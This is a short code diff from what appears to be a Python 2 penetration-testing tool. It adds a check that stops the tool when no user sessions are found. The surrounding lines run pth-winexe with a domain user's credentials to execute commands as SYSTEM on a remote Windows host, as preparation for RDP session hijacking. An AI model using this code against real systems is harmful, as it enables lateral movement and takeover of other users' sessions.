@@ -1939,6 +1939,12 @@ if rdp_connect in yesanswers or "ID" in rdp_connect:
 				print colored("[+]-uRP y is more stable:\n",'yellow')
 				proc = subprocess.Popen("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+targets[0]+" \"cmd.exe /C query user \" 2>/dev/null", stdout=subprocess.PIPE,shell=True)
 				sessions = proc.communicate()[0]
+				
+				#Check to see if sessions are available
+				if len(sessions)==0:
+					print colored("[-]No sessions were detected on the remote host",'red')		
+					sys.exit()
+
 				print sessions
 
 				lines=sessions.splitlines()
@@ -1969,6 +1975,12 @@ if rdp_connect in yesanswers or "ID" in rdp_connect:
 				print colored("[+]Note - RDP Session Hijack can be run with -uRP ID or -uRP y:\n",'yellow')			
 				proc = subprocess.Popen("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+targets[0]+" \"cmd.exe /C query user \" 2>/dev/null", stdout=subprocess.PIPE,shell=True)
 				sessions = proc.communicate()[0]
+				
+				#Check to see if sessions are available
+				if len(sessions)==0:
+					print colored("[-]No sessions were detected on the remote host",'red')		
+					sys.exit()
+
 				print sessions
 
 				lines=sessions.splitlines()
